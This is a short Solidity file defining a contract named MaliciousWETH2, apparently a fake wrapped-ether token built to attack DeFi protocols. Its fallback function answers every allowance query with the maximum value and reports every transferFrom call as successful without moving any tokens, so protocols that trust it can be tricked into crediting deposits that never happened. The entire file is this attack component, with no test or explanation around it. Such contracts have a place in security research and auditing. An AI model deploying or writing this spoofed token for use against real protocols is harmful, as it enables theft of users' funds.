// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MaliciousWETH2 {
    // Implement the allowance function to always return max uint256
    fallback() external payable {
        // Check if it's the allowance selector (0xdd62ed3e)
        if(msg.data.length >= 4 && bytes4(msg.data[0:4]) == 0xdd62ed3e) {
            // Return max allowance
            assembly {
                let x := mload(0x40)
                mstore(x, type(uint256).max)
                return(x, 0x20)
            }
        }
        // Check if it's the transferFrom selector (0x23b872dd)
        else if(msg.data.length >= 4 && bytes4(msg.data[0:4]) == 0x23b872dd) {
            // Return true
            assembly {
                let x := mload(0x40)
                mstore(x, 0x01)
                return(x, 0x20)
            }
        }
    }
}